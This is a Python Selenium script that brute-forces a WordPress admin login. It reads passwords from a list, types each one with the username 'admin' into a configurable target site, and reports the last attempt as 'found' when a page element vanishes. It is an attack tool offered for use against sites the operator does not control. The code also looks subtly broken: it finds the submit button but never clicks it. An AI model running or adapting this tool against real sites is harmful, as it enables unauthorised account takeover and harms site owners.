# Coded by Hassan Saeed
# Looking to work with other websites or project then contact me <--
import sys
import datetime
import selenium
import requests
import time as t
from sys import stdout
from selenium import webdriver
from optparse import OptionParser
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException



#Config#
parser = OptionParser()
now = datetime.datetime.now()


#*************** Ensure these Values with respect to your requirement ************
CHROME_DVR_DIR = 'C:\chromedriver_win32\chromedriver.exe'
username_selector = "#user_login"
password_selector = "#user_pass"
login_btn_selector = "#wp-submit"
username = "admin"
pass_list = "passwords_list.txt"
website="https://www.wordpress_or_any_site_url.de/wp-admin"
#*************** Ensure these Values with respect to your requirement ************


def brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website):
    f = open(pass_list, 'r')
    optionss = webdriver.ChromeOptions()
    optionss.add_argument("--disable-popup-blocking")
    optionss.add_argument("--disable-extensions")
    count = 1 #count
    browser = webdriver.Chrome(CHROME_DVR_DIR)
    while True:
        try:
            for line in f:
                browser.get(website)
                t.sleep(2)
                Sel_user = browser.find_element_by_css_selector(username_selector) #Finds Selector
                Sel_pas = browser.find_element_by_css_selector(password_selector) #Finds Selector
                enter = browser.find_element_by_css_selector(login_btn_selector) #Finds Selector
                # browser.find_element_by_css_selector(password_selector).clear()
                # browser.find_element_by_css_selector(username_selector).clear()
                Sel_user.send_keys(username)
                Sel_pas.send_keys(line)
                t.sleep(5)
                print('------------------------')
                print ('Tried Website Url: ' + website)
                print ( 'Tried password: ' + line  + 'for user: '+ username)
                print('------------------------')
                temp = line 
        except KeyboardInterrupt: #returns to main menu if ctrl C is used
            exit()
        except selenium.common.exceptions.NoSuchElementException:
            print('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! ')
            print('LAST PASS ATTEMPT BELLOW')
            print( 'Password has been found: {0}'.format(temp))
            print( 'Have fun :')
            exit()



brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)
